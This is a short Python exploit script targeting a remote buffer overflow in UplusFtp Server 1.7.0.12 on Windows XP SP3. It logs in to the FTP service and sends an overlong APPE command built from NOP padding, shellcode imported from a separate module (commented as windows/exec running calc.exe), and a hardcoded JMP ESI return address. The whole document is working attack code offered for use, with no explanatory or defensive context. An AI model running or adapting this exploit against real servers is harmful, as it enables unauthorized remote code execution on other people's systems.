#!/usr/bin/python
#
# Title: UplusFtp Server 1.7.0.12 Remote Buffer Overflow
# Date: 02-03-2010
# Author: b0telh0
# Link: http://easyftpsvr.googlecode.com/files/uplusftp-server-1.7.0.12-en.zip
# Tested on: Windows XP SP3

# CWD, DELE, LIST, MKD, NLST (and etc) commands are also vulnerable.
# 

import socket
import sys
import time


from payload import buf

import struct
def shell_attack(target_machine, target_port):
# windows/exec - 227 bytes
# EXITFUNC=process, CMD=calc.exe
    
    junk = b"\x90" * 41
    eip = b"\x4e\xae\x3a\x7e"               #7E3AAE4E   JMP ESI USER32.dll
    nops = b"\x90" * 28

    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect((target_machine,target_port))
        d=s.recv(1024)
        
        time.sleep(1)
        s.send(b'USER test\r\n')
        s.recv(1024)
       
        time.sleep(1)
        s.send(b'PASS test\r\n')
        s.recv(1024)
       
        time.sleep(1)
        s.send(b'APPE ' + junk + buf+ eip + nops + b'r\n')
       
    except:
        pass